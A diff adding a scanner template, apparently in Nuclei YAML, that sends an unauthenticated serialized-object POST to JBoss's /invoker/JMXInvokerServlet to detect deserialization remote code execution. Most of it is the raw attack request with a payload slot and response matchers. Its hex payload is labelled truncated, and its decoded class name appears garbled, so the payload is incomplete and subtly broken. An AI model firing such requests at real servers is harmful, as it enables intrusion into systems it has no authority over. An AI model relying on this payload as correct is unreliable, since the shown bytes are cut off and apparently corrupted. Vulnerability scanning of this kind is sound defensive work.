@@ -1,0 +1,37 @@
+id: jboss-jmxinvokerservlet-rce
+info:
+  name: JBoss <= 6.x JMXInvokerServlet Unauthenticated Java Deserialization RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Red Hat JBoss Application Server versions <= 6.x are vulnerable to an unauthenticated Java deserialization remote code execution vulnerability. This allows an attacker to execute arbitrary code with specially crafted serialized data.
+  reference:
+    - https://jspin.re/jboss-eap-as-6-rce-a-little-bit-beyond-xac-xed/
+http:
+  - raw:
+      - |
+        POST /invoker/JMXInvokerServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-java-serialized-object
+        Content-Length: {{payload_length}}
+
+        {{serialized_payload}}
+    payloads:
+      serialized_payload:
+        - "aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457863457863657074696f6e..." # Truncated example payload
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+          - 200
+      - type: word
+        part: body
+        words:
+          - "java.rmi.RemoteException"
+          - "Server returned HTTP response code"
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "Exception.*"
